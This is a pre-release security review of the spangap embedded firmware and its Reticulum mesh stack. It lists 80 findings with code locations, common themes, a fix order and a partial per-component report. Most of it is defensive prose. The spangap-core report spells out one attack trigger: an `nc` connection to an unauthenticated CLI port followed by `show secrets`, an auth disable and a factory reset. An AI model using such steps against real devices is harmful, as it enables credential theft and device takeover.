# Pre-release security review

Static, read-only review of the spangap platform and the Reticulous straddles,
2026-09-09 and 2026-09-10. No builds, no device commands, no fuzzing: every
finding below was traced through the code path by reading it, and each names
the file and lines. Vendored upstream code (mbedTLS, RadioLib, LVGL, u8g2, orlp
Ed25519, mlkem-native, ed25519-donna, esp_wireguard core, bzip2, MD4C, NimBLE)
was checked at the version and glue level only.

## Scope

| Group | Straddles | Status |
|---|---|---|
| Core runtime | spangap-core | reviewed |
| Web firmware | spangap-web (esp-idf half) | reviewed |
| SSH | sshd | reviewed |
| IP networking and remote access | spangap-net, acme, duckdns, upnp, updater, wg, spangap-rtc | reviewed |
| Reticulum packet/transport plane | rns (Packet, Transport, Interface, Directory, rnsd service) | reviewed |
| Reticulum crypto/session plane | rns (Identity, Link, Channel, Resource, Cryptography) | reviewed |
| Reticulum interfaces | iface-lora (including SUPE and the RNode doors), iface-tcp, iface-auto, iface-espnow, iface-ble, rnode-ble, loramon | reviewed |
| Mesh applications | lxmf, lxmproxy, nomad, rnsh, netgraph | reviewed |
| Browser, host tooling, supply chain | all `browser/` dirs, flashmon, the `spangap` tool, CI | reviewed |
| BLE and camera | spangap-ble, seccam | **not reviewed** |
| Displays and peripherals | viewer (LCD parser), spangap-lcd, tinylcd, maps, audio, gps, imu, lcdmirror, hw-* | **not reviewed** |

The viewer's browser side and its Markdown transform were covered by the
browser review; its on-device HTML parser was not. spangap-ble's pairing model
was touched only where rnode-ble and iface-ble depend on it.

## Findings by severity

| # | Sev | Straddle | Finding | Where |
|---|---|---|---|---|
| 1 | Critical | sshd | **Fixed.** Pre-auth `uint32` length overflow in the wire parser: `pos + n` wrapped on 32-bit, giving a remote crash or heap over-read from any peer that finishes KEX. `need()` now compares against the remaining bytes | `sshd_wire.h:70-75` |
| 2 | Critical | rns | **Fixed.** One LINKREQUEST with link-mode bits 2..7 in byte 64 rebooted the node from any interface: the mode was stored unchecked and `handshake()` did `throw new std::invalid_argument`, a pointer that no `catch (const std::exception&)` matches. `validate_request` now refuses modes outside `ENABLED_MODES`, all five `throw new` sites throw by value, and rnsd wraps `handle_incoming` in a catch-all backstop | `Link.cpp:175-181, 249-261, 315`, `rnsd.cpp` `onTransportRecv` |
| 3 | High | spangap-core | `show` / `show secrets` prints the whole `secrets.*` tree on every CLI channel: admin hash, live session cookies, WireGuard and SSH keys, and the Reticulum identity private key plus every ratchet (`secrets.rnsd.*`); `set secrets.*` is allowed | `storage.cpp:3054-3124`, `rnsd.cpp:402-403, 1685` |
| 4 | High | spangap-core, spangap-net | TCP CLI and log ports (`s.net.cli_port`, `s.net.log_port`) are admitted as pre-authenticated; any config writer can open them | `cli.cpp:1259-1274`, `net.cpp:270-277` |
| 5 | High | spangap-web | WebRTC DataChannel router connects to any `task:port` with no allowlist and accepts any realm: `net:2` is an outbound TCP proxy, `fs:2`/`fs:3` bypass path checks, `cli:1` is a root shell | `webrtc_task.cpp:707-793, 867-878` |
| 6 | High | spangap-web | `POST /auth/passwd` needs no session and skips the rate limiter: online password brute force, and first-writer-wins takeover of an unprovisioned device | `auth_web.cpp:63-112` |
| 7 | High | spangap-net | A silent client on a TLS port hangs the net task forever: `SO_RCVTIMEO` surfaces as `WANT_READ` and the handshake loop retries | `tls.cpp:400-436` |
| 8 | High | updater | Staged image is flashed with no signature, version or rollback check; any state-store write plus `updater -f` is a permanent implant | `updater.cpp:102-152` |
| 9 | High | spangap-net | Fallback AP is open (no WPA2) for at least ten minutes per boot, every listener binds `INADDR_ANY`, and any inbound TCP byte extends the window | `net.cpp:700-734, 491-500` |
| 10 | High | sshd | Terrapin (CVE-2023-48795) not mitigated: no strict-kex marker, no sequence reset at NEWKEYS, chacha20-poly1305 the only cipher | `sshd_session.cpp:300-322` |
| 11 | High | sshd | Two session slots, no pre-auth timeout: two idle connections lock out all SSH logins | `sshd.cpp:40, 135-144` |
| 12 | High | sshd | Any authorized key is unconditional root (`login=0` to the CLI, so finding 3 applies) | `sshd_session.cpp:910-947` |
| 13 | High | rns | Unbounded msgpack recursion in link REQUEST decode overflows the 12 KB rnsd stack; reachable over an anonymous link | `MsgPack.h:274-306, 420-450`, `Link.cpp:1426` |
| 14 | High | lxmf | The same pattern in lxmf's own msgpack walker (`mpScanNext` and `mpSkipN`) on an 8 KB task stack; any node with a throwaway identity sends a Resource-carried message up to 256 KB with a deeply nested field and reboots the node. rnsh's skipper is iterative and is the model fix | `lxmf.cpp:919-986, 1178, 1260` |
| 15 | High | rns | **Fixed.** Identity and all session keys were drawn from raw `esp_fill_random` before any radio was up, and a radio-off node never had an entropy source. spangap-core now seeds a CTR-DRBG first thing in `spangapInit` inside a `bootloader_random_enable` window and exposes it as `randomBytes()`; the rns fork, ed25519-donna's hook, sshd (seeds, ephemerals, cookies, padding, mlkem and ECP hooks) and the auth salts and tokens all draw from it. See spangap-core/docs/random.md | `spangap-core/src/random.cpp`, `Random.h`, `Ed25519.h`, `X25519.h` |
| 16 | High | flashmon (host) | Hub `POST /cmd` and `GET /log` check only the `Origin` hostname, which passes for any `localhost:*` page and for any request with no `Origin`; the token is checked only on the WebSocket. Any local process or localhost-served page runs CLI on every attached board and reads the console ring | `spangap-inside:4416-4492, 4610` |
| 17 | Medium | spangap-core | Global login backoff with no decay: one wrong password every five minutes locks the owner out of web, SSH and CLI login indefinitely; SSH password failures feed the same counter | `auth.cpp:172-182` |
| 18 | Medium | spangap-core | Boot-script and cron lines are logged verbatim, so passwords in `/state/boot` reach the browser log, the SD log file and TCP 8080 | `cli.cpp:595, 617`, `cron.cpp:320, 452` |
| 19 | Medium | spangap-core | Structured-DB text-field lengths unchecked: a crafted `.db.gz` in a restore archive or on SD gives PSRAM over-reads shipped to the browser | `storage_db.cpp:342-354` |
| 20 | Medium | spangap-core | A prepared SD card with `/sdcard/state` replaces the whole state store at next boot, no opt-in on flash | `fs.cpp:1149-1152` |
| 21 | Medium | spangap-web | Every inbound UDP datagram rewrites the single `peerAddr`, so unauthenticated packets flap a live WebRTC session | `webrtc_task.cpp:1008-1015` |
| 22 | Medium | spangap-web, spangap-net | `/state` WebDAV mapping serves and overwrites the secrets store, `tls_key.pem`, `acme_key.pem`; the backup tarball includes them | `web.cpp:2122-2123`, `tls.cpp:48-70` |
| 23 | Medium | upnp, duckdns | First SSDP responder wins; its external IP is spliced unvalidated and unencoded into the DuckDNS URL with the token (parameter injection, DNS hijack, cert for the device's name) | `upnp.cpp:441-530`, `duckdns.cpp:113-125` |
| 24 | Medium | spangap-net | `net:2` dial accepts any host and port including loopback, and runs DNS plus an 8 s connect synchronously on the net task | `net.cpp:590-684` |
| 25 | Medium | spangap-net | Eight shared relay slots, no idle timeout: one host exhausts every TCP service at once | `net.cpp:166, 374-376` |
| 26 | Medium | spangap-net | `wget` follows `https` to `http` redirects, accepts `http://`, has no size cap | `wget.cpp:47-72, 117-119` |
| 27 | Medium | spangap-net | `/state/net_up` runs as a full-privilege script on every upstream-up, so any state write (WebDAV, scp, SD card) is code execution | `net.cpp:279-291` |
| 28 | Medium | rns | Directory image blob `len` not revalidated on load: a crafted `dir.img` copies ~180 bytes past the slot into a transmitted path response | `Directory.cpp` `imageLoad`, `rdirCopyBlob` |
| 29 | Medium | rns | Half-open links and transit tables are time-bounded only; a TCP peer outruns the 60 s cull and triggers the `bad_alloc` restart | `Transport.cpp:438-470, 2088, 2098` |
| 30 | Medium | rns | Resource advertisement `n` (part count) and `d` (uncompressed size) are attacker-chosen 32-bit values allocated without a cap, and a request-flagged advertisement bypasses the resource strategy; a few advertisements with `n` around 200k exhaust PSRAM from any anonymous link | `Link.cpp:1594-1598`, `Resource.cpp:362-391, 685` |
| 31 | Medium | rns | Channel receive ring has no upper window bound: out-of-order sequence numbers up to 65534 ahead are all buffered | `Channel.cpp:246-279` |
| 32 | Medium | rns | A forged 65-byte LRPROOF with a mismatched mode byte throws before the signature check and closes the pending link; any observer of our LINKREQUEST can veto establishment (inherited from the reference) | `Link.cpp:371-373, 466-470` |
| 33 | Medium | netgraph | Sync channel on `netgraph.discovery` accepts any peer and ingests unsigned records with no membership check, unlike the allow-listed management path; fabricated nodes and links, and eviction of genuine records from the 24 KB store | `netgraph.cpp:2951, 2891, 588` |
| 34 | Medium | flashmon (host) | No `Host` check: a DNS-rebound page reads `/log`, `/hub/nodes` and `/hub/token` as same-origin GETs, which carry no `Origin` | `spangap-inside:4416-4428, 4468-4485` |
| 35 | Medium | spangap (host) | `spangap monitor` on macOS binds the raw serial console and serial log relays to `0.0.0.0` with no auth; `spangap dev` relays re-expose the device's ssh, http, wss and cli ports to the LAN | `spangap-outside:590-720, 2693-2701` |
| 36 | Medium | spangap (host) | The launcher execs whatever `spangap-outside` it finds in a workspace above `$PWD`, and `maybe_upgrade_launcher` copies a higher-versioned launcher from that workspace over the on-PATH binary: `cd attacker-repo && spangap show` is persistent code execution | `spangap:80-92, 224-231`, `spangap-outside:1236-1262` |
| 37 | Medium | spangap (host) | Dependency straddles are cloned by unvalidated `org/repo[@ref]` (schema admits `org/..`, host `--with` is unchecked, `@ref` reaches `git checkout` unguarded) and every build `git pull`s every dependency with no commit lock | `spangap-outside:2010-2123, 2131-2150` |
| 38 | Medium | viewer | The viewer iframe is unsandboxed at the device origin and MD4C runs with flags 0, so any `.md` or `.html` on `/sdcard` or `/state` executes as the admin SPA with the session cookie; `s.viewer.home_web` accepts any `http(s)` URL | `ViewerWindow.vue:28-33, 61-70`, `md_transform.cpp:157` |
| 39 | Medium | iface-auto | Discovery token is `SHA-256(group || text(src))` with the group public and `src` attacker-chosen; sixteen spoofed link-local sources fill the peer table, refuse real peers, fan every outbound packet out sixteen times, and trigger a full announce replay per fake peer | `auto.cpp:498-535, 592-606` |
| 40 | Medium | iface-auto | All three sockets bind `[::]` with no scope check on the source, so an off-link global IPv6 host can peer and inject; upstream binds link-local | `auto.cpp:304-336, 498-513, 566-583` |
| 41 | Medium | iface-tcp | Listener is open, `upnp` defaults to 1 so it is internet-exposed when upnp is built, and the eight inbound slots have no application-level idle timeout | `tcp.cpp:39, 1311-1316, 1386-1442` |
| 42 | Medium | rnode-ble | The TX characteristic has `READ_ENC` but not `NOTIFY_INDICATE_ENC`, so NimBLE leaves its CCCD plain read/write; an unbonded central subscribes, `onBleSubscribe` opens the single RNode session, the bonded phone and the serial and TCP doors are refused while it holds the connection, and it receives every LoRa packet with RSSI, SNR and the radio config. The door is on by default | `rnode_ble.cpp:105-114, 372-391`, `lora_rnode.cpp:85-104`, `lora.cpp:1406` |
| 43 | Medium | iface-lora | A 2-byte SPLIT head every five seconds keeps `splitPending` set and `drainOneOutbound` returns while it is, so a 0.6 percent duty-cycle jam stops the node transmitting entirely; alternating sequence nibbles also discard every legitimate packet over 254 bytes. IFAC does not help because the split layer runs below it | `lora_bridge.cpp:449-482, 999` |
| 44 | Medium | iface-lora | SUPE ANNOUNCE frames are unsigned and ingested on every node that has no IFAC, with `SUPE.enable` on or off: an attacker can merge two real neighbours' rows, mark a neighbour non-SUPE, file bogus path-loss pairs that drive adaptive power to the floor toward a chosen peer, and evict rows | `lora_supe.cpp:969-978, 713-820`, `lora.cpp:500-517` |
| 45 | Medium | iface-lora | With SUPE enabled, an unsigned HAIL, GOT or READY naming any of our public 3-byte tags makes the node answer and retune off the hailing channel for up to the 8 s watchdog, repeatable without limit | `supe_engine.cpp:1655-1770, 1858-1995`, `lora_supe.cpp:111-140` |
| 46 | Medium | iface-lora | The RNode TCP door (off by default) is unauthenticated by design and its settings persist, but `CMD_TXPOWER` has no lower bound (a persisted -100 dBm makes `radioStart` refuse to bring the radio up until an operator intervenes) and frequency is bounded only to 100 MHz to 2 GHz | `lora_rnode.cpp:169-338, 204-216, 232-247` |
| 47 | Low | iface-ble | Any central becomes a READY peer by subscribing and writing 16 bytes, consuming one of three peer slots and one global interface slot; identities are readable from the Identity characteristic, so a copied identity takes over a real peer's row once it has been silent 25 s. Off by default; IFAC is the intended control | `ble_iface.cpp:364-415, 253-268, 146-155`, `ble_peers.cpp:551-620` |
| 48 | Low | iface-lora | `haveIfac` tests `ifac_size != 0`, so a netname and passphrase with the default size 0 leave SUPE mounted and speaking on an access-coded network | `lora.cpp:501-511, 529-536` |
| 49 | Low | spangap-core | Cookies minted before the clock is valid never expire | `auth.cpp:431-434, 343-351, 483` |
| 50 | Low | spangap-core | Hash and cookie compares are not constant-time | `auth.cpp:80, 455, 476` |
| 51 | Low | spangap-core | `cliCollapseAbsolute` truncates 256 to 319 byte paths so `rm -r` hits a different target | `cli.cpp:219-256` |
| 52 | Low | spangap-core | Boot script stops after any line over 127 bytes; cron truncates at 127 | `cli.cpp:579-624`, `cron.cpp:443-458` |
| 53 | Low | spangap-web | Open redirect via client `Host` in the HTTP to HTTPS 301 | `web.cpp:1433-1447` |
| 54 | Low | spangap-web | STUN answered before any session exists: reflection and liveness oracle | `webrtc_task.cpp:1017-1020` |
| 55 | Low | spangap-web | `buildHeartbeatAck` has no output bound; unreachable at the current 1500 byte MTU | `webrtc_sctp.cpp:263-271` |
| 56 | Low | spangap-web (browser) | Session cookie is set from JavaScript, so it can never be `HttpOnly`, and lacks `Secure`; any same-origin script reads the 60-day admin session. `SameSite=Strict` does block CSRF | `auth.ts:22-48` |
| 57 | Low | spangap-web (browser) | `deepMerge` on the config mirror follows `__proto__` and `constructor` keys: prototype pollution from the storage channel | `stores/device.ts:92-117` |
| 58 | Low | spangap-web (browser), spangap (host) | Mesh-controlled strings reach xterm.js unfiltered, and `spangap log` prints the node label unstripped into the real terminal: cursor and OSC escape injection | `LogWindow.vue:118-123`, `spangap-inside:4586-4606` |
| 59 | Low | spangap-web (browser) | `/auth/passwd` with empty old and new is used as a read probe on every page load | `auth.ts:55-58` |
| 60 | Low | spangap-web (browser) | Every WebRTC connect sends a STUN request to Google | `webrtc-session.ts:229-231` |
| 61 | Low | spangap (host) | `spangap cli` mints the user's default `~/.ssh/id_ed25519` with no passphrase and pins host keys with `accept-new` | `spangap-outside:1511-1523` |
| 62 | Low | sshd | X25519 shared secret not checked for all-zero | `sshd_crypto.cpp:85-152` |
| 63 | Low | sshd | **Fixed with 15.** Host seed was generated from `esp_fill_random` before RF entropy was up; it now comes from the core DRBG | `sshd.cpp:84-94` |
| 64 | Low | acme | Hand-rolled DNS parser reads one byte past a 512 byte stack buffer; fixed transaction ID | `acme.cpp:244-296` |
| 65 | Low | spangap-net | Browser-set hostname is unvalidated and spliced into the X.509 DN, SOAP XML and SSID | `net.cpp:2985-2999`, `tls.cpp:112-118` |
| 66 | Low | wg | 1970 handshake timestamp before NTP; IPv6 literal endpoint mis-split; tunnel subnet not blocked while down | `wireguard-platform.c:580-592`, `wg.cpp:253-257` |
| 67 | Low | spangap-net | Self-signed cert has a fixed serial and validity window | `tls.cpp:206-225` |
| 68 | Low | rns | `rnpath -d <short>` hex-decodes with no length check: local OOB read | `rnsd.cpp` `cliRnpath` |
| 69 | Low | rns | Remote-management handlers deref `value_ptr()[0]` on a possibly empty array | `rnsd.cpp:2620, 2627, 2707` |
| 70 | Low | rns | `extra_link_proof_timeout` divides by bitrate with no zero guard | `Transport.cpp:3454` |
| 71 | Low | rns | HMAC tags compared with the vector `<` operator, variable-time; matches the Python reference | `Token.cpp:78`, `Fernet.cpp:63`, `Bytes.cpp:98-117` |
| 72 | Low | rns | ed25519-donna accepts non-canonical `S + L` signatures, so every captured signed packet has one replay past packet-hash dedupe; Python rejects them | `donna/ed25519.c:100` |
| 73 | Low | rns | LINKREQUEST MTU signalling of 1 wraps the link MDU to about 65 kB | `Link.cpp:229-241, 579` |
| 74 | Low | rns | Unauthenticated packets to a live link id refresh its liveness, and CHANNEL packets are proved before decryption: link pinning and a signed-proof reflector | `Link.cpp:1287, 1304, 1776` |
| 75 | Low | rns | Every junk DATA packet to a ratcheted destination costs up to 33 ECDH trials, roughly 100 to 150 ms of the rnsd task | `Identity.cpp:516-538`, `Type.h:267` |
| 76 | Low | rns | Compressed outbound resources hash the compressed bytes for `_expected_proof`, so an honest receiver's proof never validates (functional) | `Resource.cpp:222` |
| 77 | Low | lxmf | With `enforce_stamps` on (default off) a valid signer forces ~768 KB of hashing per novel message | `lxmf.cpp:3025-3040` |
| 78 | Low | netgraph | Crawl responses go through the depth-unbounded vendored MsgPack reader (carried by the fix for finding 13) | `netgraph.cpp:3743, 3782` |
| 79 | Low | iface-auto | Datagrams up to 1200 bytes are forwarded to rnsd against a registered MTU of 500; rnsd's 600 byte buffer contains it | `auto.cpp:82, 700-718` |
| 80 | Low | iface-tcp, iface-lora | HDLC emits frames up to 508 bytes and two 254-byte LoRa split halves reassemble to 508, eight over the MTU; `rnsdInject` clamps at 516 so nothing overflows | `tcp.cpp:77, 253-261`, `lora_bridge.cpp:465-474, 108` |

Info-level notes (design choices worth confirming rather than defects) are in
the per-straddle sections: USB console and framed RPC run with `login=0`;
`s.cron.tab.*` and `s.cli.aliases.*` make any config write command execution;
project-mismatch reset formats without the random wipe; SSH username is not
enforced; SSH port would be auto-forwarded if registered public-facing; mDNS
advertises on the AP; NTP is unauthenticated; radius-based announce retention
can be churned by fresh identities; `s.rnsd.log.trace` logs link keys and
plaintexts and is browser-writable; three dead or latent crypto-helper bugs
(`HMAC digest` double-feeds its message, PKCS7 unpad accepts a zero pad, key
material is never zeroed); CI and installers fetch unpinned; Dock icons are
injected with `v-html` from build-time straddle SVG; the dev proxy disables TLS
verification; every interface straddle stores its IFAC passphrase under `s.*`,
which syncs to every browser session, while the iface-auto and iface-espnow
READMEs and a comment in `lora.cpp` claim `secrets.*`; radio parameters have
sanity bounds only and no regional band plan; ESP-NOW framing is sound and the
magic prefix is its only filter; loramon renders announced peer names on an
LVGL label with recolor on, so a name can change the pill colour.

## Cross-cutting themes

Most of the Critical and High findings are eight structural facts, not eighty
separate bugs. Fixing each at its one choke point closes several rows.

**The CLI is root and it prints every secret.** Findings 3, 4, 5, 12 and the
USB note all end at the same place: any path to the CLI gives `show secrets`,
which returns the admin hash, every live 60-day session cookie, the SSH host
seed, the WireGuard key and the Reticulum identity private key. The paths are
the TCP relay (pre-authenticated), the DataChannel (any realm), SSH (`login=0`),
and USB. Two changes cover it: redact `secrets.*` in `cmdShow` and
`storageList` and refuse `set secrets.*` outside the auth verbs; and make every
forwarder path honour the existing login gate (`cliHandleLoginInput`) instead
of defaulting to `authed=true`.

**Auth enforcement is inconsistent across surfaces.** File mappings require
the `admin` realm, the WebRTC gate accepts any realm, `/auth/passwd` requires
none, the netgraph sync channel requires nothing while its management path is
allow-listed (33), and the RNode BLE door encrypts the command characteristic
but not the subscription that opens the session (42). The rate limiter protects
`/auth/login` only, and because it is one global counter with no decay it is
itself a lockout tool (6, 17). Route every credential check through one
function that takes the realm and the source address.

**One synchronous net task.** The TLS handshake (7), the outbound dial (24)
and the relay table (25) all run on, or block, the task that is also the WiFi
state machine and every TCP service. One silent socket is a full network DoS.
Per-connection deadlines and moving handshake and dial off the task fix all
three; sshd (11) and the iface-tcp listener (41) need the same deadline.

**Writing a file is executing code.** `/state/boot`, `/state/net_up`,
`s.cron.tab.*`, the staged firmware image (8), a prepared SD card (20, 27), and
any `.html` or `.md` opened in the viewer (38) all turn a write into full
control, and the `/state` WebDAV mapping (22) plus `wget` (26) are the writers.
The updater is the one that persists across a factory reset. Signature
verification before `esp_ota_set_boot_partition`, and secure boot v2 with flash
encryption on production builds, are the durable fix; short of that, exclude
`net_up`, `flashme.bin` and `*_key.pem` from WebDAV, render Markdown with
`MD_FLAG_NO_HTML`, and require the SD state store to be opted into from flash.

**Attacker-supplied counts and depths.** The msgpack recursion appears three
times: the vendored `MsgPack.h` (13, reached from rns and netgraph), lxmf's own
walker (14), and rnsh, which already has the iterative, count-checked skipper
that the other two should copy. The Resource advertisement (30) and the Channel
window (31) allocate from peer-chosen 32-bit numbers. The sshd overflow (1,
fixed), the storage_db (19) and directory image (28) checks are the same family
on persisted files. Every such number needs a cap before it sizes anything.

**Exceptions thrown by pointer (fixed).** `throw new std::invalid_argument`
(2) was caught by nothing, and four more sites used the same form. All five
now throw by value, and rnsd's packet entry point has a catch-all so no future
parser bug reboots the node from the air.

**Entropy before the radio (fixed).** The Reticulum identity (15) and the SSH
host seed (63) were both generated in `onInit` from `esp_fill_random` before
WiFi had started, and the S3 bootloader turns the entropy source off before
the app runs. A radio-off node never got one. spangap-core now seeds a
CTR-DRBG once at boot inside a `bootloader_random_enable` window and every key
draws from it through `randomBytes()`.

**Unsigned control state on the air.** Below IFAC, the LoRa split layer (43),
the SUPE announce and meeting frames (44, 45) and the AutoInterface discovery
token (39, 40) all let any transmitter in range change what the node does next:
stop transmitting, retune, lower power toward a chosen peer, or fill a peer
table. None of the frame decoders has a memory-safety bug; the exposure is that
control frames are believed without a signature or an access code. Gate SUPE
on IFAC being configured (48 shows the gate is wrong today), time out a split
head on the first foreign frame, and bind AutoInterface to link-local.

**Fresh devices are claimable by whoever is nearest.** Open AP (9) plus unset
admin password plus unauthenticated first password set (6) means the first
radio-range party to notice a new device owns it. A per-device random WPA2
passphrase shown on the LCD or serial, and a first-password flow bound to
physical presence, close this.

**The host tooling is a second attack surface.** The flashmon hub (16, 34)
gives any localhost page or local process the console of every attached board,
the macOS bridge (35) gives the LAN the same, and the launcher (36) and
dependency fetch (37) let a cloned repository run code as the developer. These
never ship in firmware but they sit between the developer and every board they
own.

## Suggested order before shipping

1. Done: `Link.cpp` throws by value and rejects modes outside `ENABLED_MODES` in `validate_request`; the other four `throw new` sites fixed (2).
2. Depth caps in `MsgPack.h` `skip_value` and `unpack_blob_or_object`, and in lxmf `mpScanNext` (13, 14).
3. Redact `secrets.*` from CLI `show`; login gate on TCP relay CLI; DataChannel allowlist plus `admin` realm (3, 4, 5, 12).
4. Done: a DRBG seeded under `bootloader_random_enable` before any key generation, exposed as `randomBytes()` (15, 63).
5. Rate limit and session requirement on `/auth/passwd`; per-source decaying backoff (6, 17).
6. Wall-clock deadline on `tlsAccept`; pre-auth deadline in sshd; idle timeout on iface-tcp inbound (7, 11, 41).
7. Caps on Resource advertisement `n`, `d`, `t` and on the Channel window (30, 31).
8. Hub token on flashmon `/cmd`, `/log`, `/hub/nodes` plus a `Host` check (16, 34).
9. `NOTIFY_INDICATE_ENC` on the RNode BLE TX characteristic and a bond check in `onBleSubscribe` (42).
10. Strict kex on both SSH roles (10).
11. WPA2 passphrase on the fallback AP; stop extending the window on unauthenticated traffic (9).
12. Image signature check in the updater, then secure boot and flash encryption (8).
13. SD state store opt-in from flash; gate `net_up`; exclude keys and scripts from WebDAV; `MD_FLAG_NO_HTML` in the viewer (20, 22, 27, 38).
14. Fix the `haveIfac` gate, then require IFAC for SUPE ingest and clear a pending split head on a foreign frame (43, 44, 45, 48).
15. Validate and URL-encode the UPnP external IP before DuckDNS; accept SSDP only from the gateway (23).
16. Bind iface-auto to link-local, evict oldest peer instead of refusing, rate-limit announce replay (39, 40).
17. Workspace ownership check and no auto-upgrade in the launcher; validate `org/repo@ref` and lock dependency commits (36, 37).

The remaining Mediums and Lows are each a local fix named in the per-straddle
sections below.

## What was done right

Every reviewer recorded these; they matter for deciding what not to touch.

- The targz reader rejects absolute paths, `..`, and every type but file and directory; no zip-slip.
- The web server never URL-decodes the request line, so encoded traversal cannot forge separators; the loopback exemption is unreachable off-box.
- Safe mode genuinely narrows the surface; restore formats first and any interruption lands in a clean factory store; factory reset overwrites with random bytes.
- SCTP chunk parsing is bounded throughout; the signalling WebSocket checks auth before anything else; DTLS never initialises until an authenticated offer.
- sshd verifies the AEAD tag in constant time before touching plaintext; PK_OK cannot bypass signature verification; `none` auth is rejected; port forwarding, SFTP, X11 and agent forwarding are all refused; the vendored Ed25519 does the non-canonical-S check and the buggy key-exchange API is unused; mlkem-native is pinned and encap-only.
- Every outbound HTTPS client attaches the certificate bundle and verifies the hostname; the TLS server is TLS 1.2, ECDHE-ECDSA-ChaCha20-Poly1305, P-256 only.
- `secrets.*` never reaches the browser config mirror; listen ports can only be registered by in-firmware tasks; upnp, acme and duckdns are off by default; WiFi passphrases are never logged.
- IFAC is verified before any packet parsing and matches the Python reference byte for byte; announce signatures are checked before any table insert; `Packet::unpack` and all `Bytes` slicing are bounds-safe; bzip2 decompression is output-bounded with the CVE-2019-12900 fix present; the remote-management allow list refuses unidentified and unlisted peers.
- The Reticulum token envelope is MAC-then-decrypt with no padding oracle; primitives are mbedTLS and donna, not hand-written; low-order X25519 points are rejected; announces cannot overwrite a known identity's key; LINKCLOSE, LINKIDENTIFY and interface re-pin are all authenticated; resource parts are only stored when their map hash matches an empty slot.
- rnsh admission fails closed: `login=0` only for an allow-listed identity proven by LINKIDENTIFY, everyone else meets the CLI password gate, an unset password admits nobody, and the server is off by default. Its msgpack skipper is iterative and count-checked.
- LXMF signatures are verified over the correct bytes before any storage or display; storage paths are derived only from hex hashes; stamp generation is cost-capped; propagation-node blobs go through the same verify and dedup pipeline.
- The browser SPA has no reachable HTML sink fed by mesh data: the Micron renderer is an escaping allowlist renderer, LXMF bodies are interpolated with the only `href` regex-limited to `https?://`, netgraph names are escaped, nothing sensitive is persisted in localStorage or IndexedDB, all lockfile URLs resolve to `registry.npmjs.org`, and the GitHub workflows use read-only permissions with no `pull_request_target`.
- No frame decoder in any interface straddle has a memory-safety bug: HDLC, the LoRa split layer, KISS, the SUPE codec, BLE fragment reassembly and ESP-NOW are all bounded. iface-tcp's HDLC decoder resyncs on FLAG with rate-limited drop reporting; iface-espnow filters on magic in the WiFi callback before any allocation; the RNode KISS RX characteristic is correctly `WRITE_ENC`; the rnsd registration path clamps every string field and refuses duplicate interface names.

---

# Per-straddle reports

The reviewer reports follow verbatim, one per group.


---

# spangap-core

## Coverage (what was read; what was skipped)

**Read in full:** README.md; docs/auth.md, auth-internals.md, cli.md, cli-internals.md, framed-rpc.md, storage.md, storage-internals.md, fs.md, fs-internals.md, its.md, its-internals.md, safe-mode.md, cron.md, cron-internals.md, remote-access.md, onboarding-output.md, usb-console-internals.md (first 80 lines); esp-idf/src/auth.cpp, cli.cpp (all 2650 lines: registry, line editor, login gate, CLI task, serial task, framed RPC), cli_cmd_fs.cpp, cli_cmd_sys.cpp, cli_cmd_mount.cpp, cron.cpp, targz.cpp, spangap_init.cpp; include/auth.h, cli.h (first 140 lines), targz.h; components/spanfs/src/spanfs.c, include/spanfs.h; data/factory_state/boot, net_up.

**Read in part (targeted regions):** storage.cpp — navigatePath/navigateOrCreate, isSecret/isFw/isStorageDb, walkTreeCollect, readFileStr, atomicWriteFile, gzDeflate/gzInflate/readJsonFile, scanExternals/loadExternals/storageLoad, storageNewTreeFile, the five CLI verbs (set/reset/unset/show/save), dcBuildDumpInto, dcAccumulateChange, dcResolveKey/dcFlushPatch, dcShipStorePrefix, mergeIncomingPatch, dcHandleMessage/dcPollConfig, storageItsConnect. fs.cpp — opUsesPath/handleOp/onFsOp, copyFile/copyTree/fs_factory_reset, fsSetRestoreMarker/clearTree/fsClearSdState/fsFormatStateStore/fsSelectStateStore, fsFactoryWipeExtent/fsWipeFlashState, fs_listdir. its.cpp — itsRecv (packet, legacy-packet and stream paths) and the grep-located size guards. storage_db.cpp — rebuildIndex, readRecordText, sdbLoad, sdbGetField/sdbGetFieldBin. log.cpp — logFileOpen/logFileWrite, logVprintf sanitiser and console echo, logPasteBack, logTcpConnect/logDcConnect, cmdLogfile/isLogDateFile, log file path construction. spanfs_esp.c (first 120 lines). scripts/write-build-info.py and spanfs/tools/mkspanfs.py (headers only). Also, to rank the TCP CLI finding, spangap-net/esp-idf/src/net.cpp netRegisterCorePorts/netAcceptOne and net.h net_connect_t, and one grep in spangap-web (webrtc_task.cpp authCheck).

**Not covered:** pm.cpp (1710 lines, only the command table grep), usb_ports.cpp (TinyUSB CDC internals, only read-entry grep), log.cpp inbound-line fan-out and logrotate body, its.cpp connect/forward/aux/inbox internals beyond the size guards, storage.cpp op-list parser storageApplyOps (senders are in-firmware tasks only), storage.cpp provider/structured-DB routing, storage_db.cpp mutation/compaction paths, spanfs_esp.c VFS ops past the open path, timezones*, heap_track_stub.c, mem_new.cpp, spi_helper, detect_probe.h, the remaining scripts (gen-partitions.py, report-*.py, update-zones.py, reallyclean.sh), the .old.md docs.

## Findings

### [High] `s.net.cli_port` / `s.net.log_port` expose the CLI and log over TCP with no authentication, and core admits such connections as authenticated
**Where:** esp-idf/src/cli.cpp:1259-1274 (`cliTcpConnect`), esp-idf/include/cli.h:52-59 (`login` field); spangap-net/esp-idf/src/net.cpp:271-276 and 377-385 for how net dials in.
**Attacker:** (1) unauthenticated on the LAN (and internet if the operator forwards the port; net registers these `publicFacing=false`, so UPnP does not forward them by itself).
**Issue:** The login gate exists only when the connect payload is exactly a `cli_connect_t` with `login != 0`. Net forwards a raw TCP client with its own `net_connect_t` (`ws`, `tls`, `ip_addr_t` — larger than the 5-byte `cli_connect_t`), which lands in the `else` branch: `cl.mode = CLI_LINE`, `cl.loginRequired = false`, so `cl.authed = true`. Nothing in core makes that path honour `authEnabled()` or the admin password. The same applies to `LOG_PORT_TCP` (8080), which streams the full log including everything the cron/boot-script logging in finding 3 puts there. Both ports default to 0 (off) and are enabled with a single `set s.net.cli_port=8081`, which the docs present as the ordinary "raw TCP — `nc <device> 8081`" access path.
**Trigger:** Operator sets `s.net.cli_port=8081` (docs/cli.md line 20 describes it as a normal channel). Anyone on the LAN: `nc <device> 8081`, then `show secrets` (dumps admin hash and all live session cookies), `set secrets.auth.enable=0`, `auth passwd admin x`, `reset factory`, `run /sdcard/anything`, etc.
**Impact:** Full device compromise from the network with no credential.
